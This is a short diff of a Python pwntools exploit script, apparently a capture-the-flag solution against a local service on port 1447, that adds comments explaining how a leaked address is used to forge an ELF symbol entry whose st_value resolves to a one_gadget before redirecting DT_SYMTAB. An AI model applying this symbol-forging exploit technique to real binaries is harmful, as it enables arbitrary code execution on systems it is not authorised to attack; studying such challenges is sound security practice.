@@ -220,12 +220,14 @@ p = remote("localhost", 1447)
 p.recvuntil(b"distance: ")
 entropy = int(p.recvline().strip(), 16)
 
+# Compute forged st_value so that st_value + l_addr == one_gadget
 st_value = -(entropy + ONE_GADGET_OFFSET) & 0xffffffffffffffff
 
+# Fake ELF symbol entry: all fields copied except st_value
 fake_sym = (
-    p64(0x19) +
-    p64(0xd001200000020) +
-    p64(st_value)
+    p64(0x19) +                    # st_name (copied)
+    p64(0xd001200000020) +         # st_info / st_other / st_shndx / st_size
+    p64(st_value)                  # forged st_value
 )
 
 # Redirect DT_SYMTAB
